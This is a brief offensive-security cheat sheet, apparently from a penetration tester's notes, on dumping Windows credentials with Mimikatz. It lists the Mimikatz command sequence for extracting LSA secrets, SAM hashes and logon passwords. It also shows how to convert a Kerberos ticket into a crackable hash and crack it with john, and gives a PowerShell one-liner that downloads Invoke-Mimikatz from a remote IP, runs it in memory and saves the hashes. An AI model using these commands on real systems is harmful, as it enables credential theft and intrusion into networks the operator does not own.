---
title: Mimikatz - Credential Dumps
category: ad
subcategory: ad-attacks
os: windows
command: sekurlsa::logonpasswords
tools: mimikatz
---


### Standard sequence

```
privilege::debug
token::elevate
lsadump::lsa /patch
lsadump::sam
sekurlsa::logonpasswords
```

### Convert kirbi to crackable hash (Kerberoast)

```bash
python3 kirbi2john.py 3-40a10000-xor-app59\$@MSSQLSvc\~xor-app23.xor.com\~1433-XOR.COM.kirbi -o MSSQLSvc.txt
john MSSQLSvc.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Inline PowerShell dump (Invoke-Mimikatz)

```powershell
IEX (New-Object System.Net.Webclient).DownloadString('http://172.16.242.173/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"' > hashes.txt
```
